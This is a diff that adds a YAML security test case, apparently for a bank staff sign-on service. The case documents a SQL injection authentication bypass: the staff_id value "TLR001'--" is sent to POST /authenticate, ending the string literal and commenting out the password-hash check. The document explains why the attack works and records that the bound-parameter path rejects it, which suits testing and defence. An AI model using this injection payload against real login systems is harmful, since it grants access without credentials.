@@ -1,0 +1,13 @@
+# LG-SQLI-001 — SQL injection auth bypass in the single-query staff sign-on (SIGNON-BY-QUERY).
+# Exploitable only under a profile with session_roaming=on (the dynamic concatenated query path).
+preconditions:
+  - "config session_roaming=on"
+steps:
+  - call: "POST /authenticate"
+    body: { staff_id: "TLR001'--", password: "any-wrong-password" }
+    expect: "authenticated=true as TLR001 despite a password that does not match TLR001's hash"
+observable: >
+  The response is {"authenticated":true,"role":"TELLER","branch":"0007"} for a password that is not
+  TLR001's. The injected staff_id closes the string literal and the -- comments out the
+  "AND pw_hash = '<hash>'" predicate, so the row is returned on identity alone. Under session_roaming=off
+  the same request returns {"authenticated":false,"reason":"NOSTAFF"} (the value is bound, not parsed).
